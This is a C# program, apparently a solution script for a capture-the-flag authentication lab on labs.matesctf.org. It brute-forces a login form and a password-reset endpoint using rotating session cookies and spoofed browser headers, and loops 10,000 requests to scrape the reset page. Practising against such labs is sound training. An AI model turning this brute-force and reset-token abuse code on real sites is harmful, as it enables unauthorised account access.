using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Web;
using System.Net;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.IO;
using System.IO.IsolatedStorage;
using System.Security.Cryptography;

namespace FuzzWebLab3_Blind1
{
    class Program
    {
        //public bool bruteForce(string pass)
        //{
        //    String uri = "https://labs.matesctf.org/lab/auth/3/index.php?page=login";
        //    System.IO.Stream stream;
        //    System.IO.StreamReader sr;
        //    String Out;

        //    Cookie ck = new Cookie("ASP.NET_SessionId", "hainhc");
        //    CookieContainer reqCookies = new CookieContainer();
        //    ck.Domain = "labs.matesctf.org";
        //    HttpWebRequest rq = (HttpWebRequest)WebRequest.Create(uri);
        //    rq.Method = "POST";
        //    rq.Timeout = 20000;
        //    rq.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
        //    rq.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*";
        //    rq.Headers.Add("Accept-Language", "vi-VN,vi;q=0.8,fr-FR;q=0.6,fr;q=0.4,en-US;q=0.2,en;q=0.2");
        //    rq.CookieContainer = reqCookies;
        //    rq.CookieContainer.Add(ck);
        //    byte[] data = new System.Text.ASCIIEncoding().GetBytes(pass);
        //    rq.ContentType = "application/x-www-form-urlencoded";
        //    rq.ContentLength = data.Length;
        //    System.IO.Stream postStream = rq.GetRequestStream();
        //    postStream.Write(data, 0, data.Length);
        //    postStream.Close();
        //    HttpWebResponse hr;
        //    hr = (HttpWebResponse)rq.GetResponse();
        //    stream = hr.GetResponseStream();
        //    sr = new System.IO.StreamReader(stream);
        //    Out = sr.ReadToEnd();
        //    if ((Out.IndexOf("<strong>username or password not correct</strong>") == -1) && (Out.IndexOf("Internal Server Error") == -1))
        //    {
        //        return true;
        //    }
        //    return false;
        //}
        static void Main(string[] args)
        {
            string x, y;
            for (int i = 0; i < 10000;i++ )
            {
                x = Get("https://labs.matesctf.org/lab/auth/5/index.php?page=reset&token=D1eDeBpe0sIT0N9Lf89R86cctHFRCh3ynVfE24PE");
                y = GetLine(x, 31);
                Console.WriteLine(y);
            }
            //System.Console.WriteLine(lineUsername);
           
        }

        static bool bruteForce(string pass, int month)
        {
            String uri = "https://labs.matesctf.org/lab/auth/5/index.php?page=reset&token=504jbOAds4XOo6SjHwMnI3c3nYXn6fO030rXoX5Y";
            System.IO.Stream stream;
            System.IO.StreamReader sr;
            String Out;

            Cookie ck = new Cookie("ASP.NET_SessionId", "hainhcxxx" + month.ToString());
            CookieContainer reqCookies = new CookieContainer();
            ck.Domain = "labs.matesctf.org";
            HttpWebRequest rq = (HttpWebRequest)WebRequest.Create(uri);
            rq.Method = "GET";
            rq.Timeout = 20000;
            rq.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
            rq.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*";
            rq.Headers.Add("Accept-Language", "vi-VN,vi;q=0.8,fr-FR;q=0.6,fr;q=0.4,en-US;q=0.2,en;q=0.2");
            rq.CookieContainer = reqCookies;
            rq.CookieContainer.Add(ck);
            rq.ContentType = "application/x-www-form-urlencoded";
            HttpWebResponse hr;
            hr = (HttpWebResponse)rq.GetResponse();
            stream = hr.GetResponseStream();
            sr = new System.IO.StreamReader(stream);
            Out = sr.ReadToEnd();
            if ((Out.IndexOf("<strong>username or password not correct</strong>") == -1) && (Out.IndexOf("Internal Server Error") == -1)
                && (Out.IndexOf("<strong>username or password not match</strong>") == -1))
            {
                return true;
            }
            return false;
        }

        static string Get(string uri)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (Stream stream = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(stream))
            {
                return reader.ReadToEnd();
            }
        }

        static string GetLine(string text, int lineNo)
        {
            string[] lines = text.Replace("\r", "").Split('\n');
            return lines.Length >= lineNo ? lines[lineNo - 1] : null;
        }

    }
}
